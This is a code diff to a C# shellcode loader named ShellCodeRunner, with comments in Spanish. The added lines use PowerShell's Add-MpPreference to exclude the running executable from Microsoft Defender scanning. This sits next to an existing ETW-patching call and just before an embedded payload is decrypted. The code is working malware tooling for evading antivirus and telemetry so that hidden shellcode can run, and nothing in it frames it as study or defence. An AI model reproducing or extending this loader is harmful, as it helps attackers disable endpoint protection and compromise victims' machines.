@@ -29,6 +29,8 @@
 using System;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
 
 namespace ShellCodeRunner
 {
@@ -73,6 +75,16 @@ namespace ShellCodeRunner
 
             ByPassUtility.PatchETW();
 
+            using (PowerShell PowerShellInst = PowerShell.Create())
+            {
+                //con esto  guardamos la carpeta donde  estamos ubicados 
+                //string path = Directory.GetCurrentDirectory();
+
+                //guardar cualquier carpeta 
+                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                PowerShellInst.AddScript(@"Add-MpPreference -ExclusionPath '" + path + "'");//excluir una carpeta 
+                Collection<PSObject> hola = PowerShellInst.Invoke();
+            }
             // Get decrypted pic
             byte[] pic = GetAllDecryptedBytes();
 
